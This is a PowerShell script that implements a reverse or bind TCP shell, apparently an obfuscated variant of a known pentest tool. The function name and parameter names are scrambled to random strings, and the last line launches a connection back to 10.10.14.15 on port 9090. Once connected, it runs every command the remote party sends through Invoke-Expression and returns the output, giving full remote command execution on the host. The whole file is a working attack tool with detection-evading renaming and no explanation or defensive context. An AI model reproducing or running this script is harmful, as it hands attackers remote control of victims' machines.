function vane 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $ZHlEuCdS99,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $ggdEUXQE99,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )
    
    try 
    {
        if ($ggdEUXQE99)
        {
            $uWiQDqZf99 = New-Object System.Net.Sockets.TCPClient($ZHlEuCdS99,$Port)
        }
        if ($Bind)
        {
            $OZUPKwmC99 = [System.Net.Sockets.TcpListener]$Port
            $OZUPKwmC99.start()    
            $uWiQDqZf99 = $OZUPKwmC99.AcceptTcpClient()
        } 
        $dwYLghpn99 = $uWiQDqZf99.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        $RdFZSvIQ99 = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $dwYLghpn99.Write($RdFZSvIQ99,0,$RdFZSvIQ99.Length)
        $RdFZSvIQ99 = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $dwYLghpn99.Write($RdFZSvIQ99,0,$RdFZSvIQ99.Length)
        while(($i = $dwYLghpn99.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $QJGDpgeU99 = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $QJGDpgeU99.GetString($bytes,0, $i)
            try
            {
                $ZHXRFPGB99 = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $RwauAnhu99  = $ZHXRFPGB99 + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $RwauAnhu99 = $RwauAnhu99 + $x
            $AURWnxvH99 = ([text.encoding]::ASCII).GetBytes($RwauAnhu99)
            $dwYLghpn99.Write($AURWnxvH99,0,$AURWnxvH99.Length)
            $dwYLghpn99.Flush()  
        }
        $uWiQDqZf99.Close()
        if ($OZUPKwmC99)
        {
            $OZUPKwmC99.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
vane -ggdEUXQE99 -ZHlEuCdS99 10.10.14.15 -Port 9090
